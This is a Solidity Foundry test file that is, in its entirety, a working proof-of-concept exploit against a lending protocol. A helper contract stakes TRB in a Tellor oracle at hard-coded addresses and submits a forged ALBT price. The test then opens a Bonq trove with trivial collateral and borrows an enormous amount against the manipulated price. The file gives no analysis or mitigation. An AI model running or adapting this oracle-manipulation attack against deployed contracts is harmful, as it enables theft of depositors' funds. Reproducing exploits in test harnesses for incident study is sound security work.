// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
interface WALBT{
    function mint(address _account, uint256 _amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface TRB{
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}
interface TellorFlex{
    function getStakeAmount() external view returns (uint256);
    function depositStake(uint256 _amount) external;
    function submitValue(
        bytes32 _queryId,
        bytes calldata _value,
        uint256 _nonce,
        bytes calldata _queryData
    ) external;
}
interface Trove{
    function increaseCollateral(uint256 _amount, address _newNextTrove) external;
    function borrow(
        address _recipient,
        uint256 _amount,
        address _newNextTrove
    ) external;

}
interface BonqProxy{
    function createTrove(address _token) external returns (address trove);
}
contract baf4{
    TRB trb1=TRB(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
    TellorFlex tellorflex1=TellorFlex(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);
    function updatePrice(uint256 amount0,uint256 amount1) public{
        trb1.approve(address(address(tellorflex1)),type(uint256).max);
        tellorflex1.depositStake(amount0);
        tellorflex1.submitValue(hex"12906c5e9178631dba86f1f750f7ab7451c61e6357160eb890029b9eac1fb235",hex"00000000000000000000000000000000000000001027e72f1f12813088000000",0,hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000");
    }
}
contract CounterTest is Test {

    function setUp() public {

    }
    TellorFlex tellorflex=TellorFlex(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);
    WALBT walbt=WALBT(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
    TRB trb=TRB(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
    BonqProxy bonqproxy=BonqProxy(0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3);
    function testa() public{
        vm.prank(0xA16dfA9a67e6Aa054B2c0789B0c0Eb774371D004);
        walbt.mint(address(this),13359732562723399770);
        vm.prank(0x3F0C1eB3FA7fCe2b0932d6d4D9E03b5481F3f0A7);
        trb.transfer(address(this),25152286123277919410);
        baf4 BAF4=new baf4();
        uint256 r0=tellorflex.getStakeAmount();
        trb.transfer(address(BAF4),r0);
        BAF4.updatePrice(r0,5000000000000000000000000000);
        address a0=bonqproxy.createTrove(address(walbt));
        walbt.transfer(address(a0),100000000000000000);
        Trove(a0).increaseCollateral(0,address(0x0000000000000000000000000000000000000000));
        Trove(a0).borrow(address(this),100000000000000000000000000,address(0x0000000000000000000000000000000000000000));
        console2.log(walbt.balanceOf(address(this)));
    }
}
